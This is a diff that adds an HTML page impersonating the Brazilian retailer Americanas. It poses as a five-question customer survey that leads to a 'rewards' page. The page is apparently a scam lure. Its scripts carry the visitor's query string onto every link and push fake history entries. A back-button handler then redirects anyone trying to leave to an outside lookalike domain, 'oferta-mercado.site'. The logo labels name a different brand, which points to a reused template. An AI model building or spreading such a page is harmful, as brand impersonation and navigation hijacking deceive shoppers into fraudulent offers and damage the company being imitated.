@@ -1,0 +1,304 @@
+<html lang="pt-br"><head></head><body>﻿
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="css/style14.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Helvetica&amp;display=swap">
+    <link rel="icon" href="favicon-americanas.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="responda.html">
+
+    <link rel="stylesheet" href="css2">
+    <title>Americanas</title>
+<script src="js/latest.js" async="" defer=""></script>
+    <script>
+        function onLoad() {
+            var links = document.getElementsByTagName("a");
+
+            for (var i = 0, n = links.length; i < n; i++) {
+            if (links[i].href.includes("#")) {
+                continue;
+            }
+
+            var href =
+                links[i].href.trim() +
+                (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+                document.location.search.replace("?", "").toString();
+            links[i].href = href;
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", onLoad);
+    </script>
+
+
+
+
+
+
+    
+
+
+    <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-right: 1%;">
+            <img src="images/menub.png" style="height: 2.5vh; color: white" alt="Logo Central Vivara">
+        </div>
+        
+        <div class="menu-icon" style="padding-left: 1%;">
+            <img src="https://lh3.googleusercontent.com/pw/AJFCJaWKTj8YIP9Q09HepMkJUwLlwoda3GrGnmknysdSNy8ozjB8tqJ14ARDMZjcsBUcZu-O_N4ZHAhAfFo3iVKwwiFPS7bPYLAIyRd3NA5ITeh97j5goZgIA_zbjO2LJYEySsJW3zcabT9mUg4HUPIXzqlX=w400-h83-s-no" style="height: 3vh;" alt="Logo Central Vivara">
+        </div>
+
+        <div class="logo-central">
+        </div>
+        
+<div class="menu-icon" style="padding-right: 0%;">
+            <img src="images/perfilb.png" style="height: 2.5vh; color: white" alt="Logo Central Vivara">
+        </div>
+        
+        <div class="menu-icon" style="padding-right: 0%;">
+            <img src="images/lojabb.png" style="height: 2.5vh; color: white" alt="Logo Central Vivara">
+        </div>
+        
+        <div class="menu-icon" style="padding-right: 0%;">
+            <img src="images/corabb.png" style="height: 2.5vh; color: white" alt="Logo Central Vivara">
+        </div>
+        
+        <div class="menu-icon" style="padding-right: 3%;">
+            <img src="images/cestabb.png" style="height: 2.5vh; color: white" alt="Logo Central Vivara">
+        </div>
+    </nav>
+    
+    <div id="progress1" style="display: block">
+        <p style="text-align: center; font-family: 'Helvetica'; font-size: 22px; padding-top: 10px;">Pergunta 1 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="progress2" style="display: none;">
+        <p style="text-align: center; font-family: 'Helvetica'; font-size: 22px; padding-top: 10px;">Pergunta 2 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress2"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="progress3" style="display: none;">
+        <p style="text-align: center; font-family: 'Helvetica'; font-size: 22px; padding-top: 10px;">Pergunta 3 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress3"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="progress4" style="display: none;">
+        <p style="text-align: center; font-family: 'Helvetica'; font-size: 22px; padding-top: 10px;">Pergunta 4 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress4"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="progress5" style="display: none;">
+        <p style="text-align: center; font-family: 'Helvetica'; font-size: 22px; padding-top: 10px;">Pergunta 5 / 5</p>
+
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress5"></div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+    <div class="pergunta" id="p1">
+        <p class="pergunta_title">Como você classificaria a experiência de compra na Americanas considerando a facilidade de navegação no site ou aplicativo?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Muito fácil
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Fácil
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Moderadamente fácil
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Difícil
+            </label>
+        </div>
+
+        <button class="pergunta-botao" onclick="showAd2();">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+
+
+
+    <div class="pergunta" id="p2" style="display: none">
+        <p class="pergunta_title">O que você acha da diversidade de produtos oferecidos no MarketPlace Americanas?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Excelente
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Boa
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Aceitável
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Insatisfatória
+            </label>
+        </div>
+
+        <button class="pergunta-botao" onclick="showAd3();">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+
+
+
+    <div class="pergunta" id="p3" style="display: none">
+        <p class="pergunta_title">Como você avaliaria a eficiência na entrega dos produtos comprados na Americanas?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Rápida
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Aceitável
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Lenta
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Muito Lenta
+            </label>
+        </div>
+
+        <button class="pergunta-botao" onclick="showAd4();">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+
+
+
+    <div class="pergunta" id="p4" style="display: none">
+        <p class="pergunta_title">Como você descreveria o serviço de atendimento ao cliente da Americanas?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Excelente
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Bom
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Regular
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Insatisfatório
+            </label>
+        </div>
+
+        <button class="pergunta-botao" onclick="showAd5();">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+
+
+
+    <div class="pergunta" id="p5" style="display: none">
+        <p class="pergunta_title">Como você avalia a precisão das descrições dos produtos na Americanas?</p>
+
+        <div class="radio-container">
+            <label>
+                <input type="radio" name="difficulty" value="muito-facil">
+                Muito precisa
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="facil">
+                Precisa
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="moderadamente-facil">
+                Moderadamente precisa
+            </label>
+            <label>
+                <input type="radio" name="difficulty" value="dificil">
+                Imprecisa
+            </label>
+        </div>
+
+        <button class="pergunta-botao" id="recompensas">Enviar</button>
+
+        <div style="padding-bottom: 20px;"></div>
+    </div>
+    
+    
+
+    
+
+
+    <script src="js/scripts.js"></script>
+
+
+    <script>
+      setTimeout(function () {
+      var button = document.querySelector("#recompensas");
+  
+      // Alterando a variável link para a nova URL
+      var link = "../recompensas";
+  
+      button.addEventListener("click", function () {
+          window.location.href = link + window.location.search;
+      });
+  }, 1000);
+    </script>
+
+
+
+<script>
+    var urlBackRedirect = 'https://oferta-mercado.site/ml/recompensas/'; // lembre-se de usar a url sem espaços
+    // não altere nada abaixo dessa linha
+    urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+    history.pushState({}, "", location.href);
+    history.pushState({}, "", location.href);
+    window.onpopstate = function () {
+        setTimeout(function () {
+            location.href = urlBackRedirect;
+        }, 1);
+    };
+</script>
+</body></html>
